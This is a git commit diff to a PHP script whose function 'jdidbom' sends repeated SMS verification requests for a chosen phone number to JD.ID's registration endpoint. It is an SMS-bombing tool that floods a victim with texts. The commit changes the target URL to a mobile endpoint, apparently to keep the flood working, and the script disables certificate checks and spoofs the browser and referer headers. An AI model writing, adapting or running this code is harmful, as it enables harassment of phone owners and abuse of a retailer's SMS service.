4756adfea78aab1f0d7b31f2eab65cbebce76881
Cahyadii <44307552+Cahyadii@users.noreply.github.com>
2018-10-20 07:53:57 +0700

    Update 5.php

--- 5.php
+++ 5.php
@@ -3,14 +3,14 @@ function jdidbom($no, $jum, $wait){
     $x = 0; 
     while($x < $jum) {
         $ch = curl_init();
-        curl_setopt($ch, CURLOPT_URL,"https://passport.jd.id/register/phone/sendPhoneSms");
+        curl_setopt($ch, CURLOPT_URL,"http://m.jd.id/phone/sendPhoneSms");
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS,"phone=".$no."&smsType=1");
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-        curl_setopt($ch, CURLOPT_REFERER, 'https://passport.jd.id/register/phone/bindingPhone.html');
+        curl_setopt($ch, CURLOPT_REFERER, 'http://m.jd.id/phone/bindingPhone.html');
         curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
         $server_output = curl_exec ($ch);
         curl_close ($ch);
